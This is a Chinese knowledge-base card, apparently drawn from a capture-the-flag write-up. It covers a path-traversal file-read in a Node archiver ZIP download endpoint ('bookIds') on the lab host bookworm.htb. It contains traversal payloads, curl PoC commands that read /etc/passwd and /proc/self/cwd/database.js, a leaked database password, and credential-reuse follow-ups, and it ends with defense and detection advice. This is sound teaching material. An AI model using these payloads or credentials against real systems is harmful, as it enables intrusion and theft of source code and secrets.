---
id: web-generic-file-inclusion-node-archiver-bookids-zip-traversal
title: Node/archiver 打包下载 bookIds 路径穿越：/proc/self/cwd/database.js 读源码与数据库凭据
type: scenario
domain: web
path: web/generic/file-inclusion
technique: node-archiver-bookids-zip-path-traversal
aliases:
- bookIds 路径穿越
- archiver 打包下载穿越
- Bookworm LFI
- database.js 读取
- /proc/self/cwd
- zip 下载任意文件
tags:
- web
- nodejs
- express
- archiver
- path-traversal
- arbitrary-file-read
- zip-download
- lfi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V304
  verified_at: '2026-11-08T11:43:34+08:00'
  notes: 已对照 content.md 与 img25-32 核对：/download/15?bookIds=20 原始请求、bookIds 被替换为 ../../../../../../proc/self/cwd/database.js、ZIP 条目 Unknown.pdf 解压为 passwd、node index.js 引用 archiver、database.js 暴露 bookworm:FrankTh3JobGiver 均与原文一致。未验证点：PoC 中 /etc/passwd 请求为等价推演，原文实际读的是 /proc/self/cwd/database.js 与 /etc/passwd。
---

## 一句话结论

Bookworm 的 `/download/<id>?bookIds=...` 用 archiver 把选中的“书籍”打成 ZIP 返回；`bookIds` 被直接当作文件路径使用，提交 `../../../../../../etc/passwd` 可让服务端把 `/etc/passwd` 打进 ZIP，提交 `../../../../../../proc/self/cwd/database.js` 可读取 Node 应用源码与 MariaDB 凭据 `bookworm:FrankTh3JobGiver`。

## 原理

- **打包下载的实现范式**：下载接口接收 `bookIds`（逗号分隔的书籍 ID），后端把每个 ID 解析成文件路径，用 archiver 逐个 `file()`/`append()` 到 ZIP 流并返回。若没有对路径做规范化/白名单，`bookIds` 中的 `../` 会跳出书籍目录。
- **为什么用 `/proc/self/cwd`**：Node 进程的当前工作目录通常是应用根；`/proc/self/cwd` 是指向该目录的魔术链接，配合 `../` 可稳定定位 `database.js`、`index.js` 等源码，无需知道绝对路径。
- **ZIP 是读取载体**：即使目标文件不是书籍/图片，archiver 也会按字节读入 ZIP；下载后解压即可拿到原文。本题下载得到的 ZIP 中条目名为 `Unknown.pdf`/`passwd` 等，解压后是 `/etc/passwd` 内容。
- **危害放大**：读到 `database.js` 后获得 MariaDB 的 `host/user/database/password`，可进一步连库、复用密码 SSH；读源码可发现更多路由与漏洞（如后续 calibre 转换器）。
- **边界**：若 `bookIds` 只接受数字 ID 并由数据库映射真实路径、或 `realpath` 校验在书籍目录内，则穿越失败；若下载接口对条目名/扩展名做白名单也会阻断。

## 触发条件

- 存在按 ID/文件名打包下载的接口，参数（如 `bookIds`）进入文件路径拼接。
- 未做 `path.resolve` + 允许目录校验，`..`、绝对路径或 `/proc/self/cwd` 可用。
- Web 进程对目标文件有读权限；ZIP 响应可直接下载。
- 可能需要已登录会话（本例注册普通用户即可）。

## 利用步骤

1. 登录后访问任意订单/下载页，抓取 `/download/<id>?bookIds=<id>` 请求。
2. 把 `bookIds` 改成 `../../../../../../etc/passwd`，下载响应并用 `unzip` 解压，确认包含 `passwd`。
3. 改读 `/proc/self/cwd/database.js` 或 `index.js`，获取数据库配置/源码。
4. 从 `database.js` 提取 `user/password/database`（本例 `bookworm:FrankTh3JobGiver`），尝试连库或密码复用 SSH。
5. 继续读 `.env`、配置文件、其他用户目录（权限允许时）。
6. 记录请求、ZIP 条目与解压内容作为证据。

## PoC

```http
GET /download/15?bookIds=../../../../../../etc/passwd HTTP/1.1
Host: bookworm.htb
Cookie: session=<...>
```

```bash
curl -s -b 'session=<...>' \
  'http://bookworm.htb/download/15?bookIds=../../../../../../etc/passwd' -o out.zip
unzip out.zip
cat passwd
```

读取源码/凭据：

```http
GET /download/15?bookIds=../../../../../../proc/self/cwd/database.js HTTP/1.1
Host: bookworm.htb
Cookie: session=<...>
```

```javascript
// database.js 摘录
const sequelize = new Sequelize({
  dialect: "mariadb",
  dialectOptions: { host: "127.0.0.1", user: "bookworm",
                     database: "bookworm", password: "FrankTh3JobGiver" },
  logging: false
});
```

## 变体与关联

- **批量打包**：`bookIds` 可一次传多个路径（逗号分隔），把源码目录、配置、备份一起打包；条目名可能被重命名/去扩展，需解压核对。
- **其他路径**：`../../../../../../etc/shadow`、`/proc/self/environ`、`/proc/self/cmdline`、应用 `.env`；Windows 目标用 `..\`。
- **同源技巧**：打包/导出接口的 path 参数穿越，见 [[web-generic-file-inclusion-zipdownload-export-path-traversal]]（通用打包下载穿越卡）；本卡是 Node archiver + `bookIds` 的具体实现。
- 后续：读到的 `database.js` 凭据/源码可用于连库、SSH 与发现内部 3001 转换器。

## 检测与防御

- **防御**：`bookIds` 只接受数字 ID，由数据库查询真实文件路径；拼接后 `fs.realpath` 校验必须位于书籍/下载目录内；拒绝 `..`、`/proc`、绝对路径与空字节。
- **架构**：下载服务以低权限运行，书籍目录与源码/配置/数据库物理隔离；不要把 `database.js`、`.env` 放在可被 Web 进程读到的同一目录。
- **检测**：`bookIds` 中出现 `../`、`/proc/self`、`/etc`、`.js`、`.env`；下载响应 ZIP 条目数/大小异常；同一用户短时间内下载多个源码/系统文件。
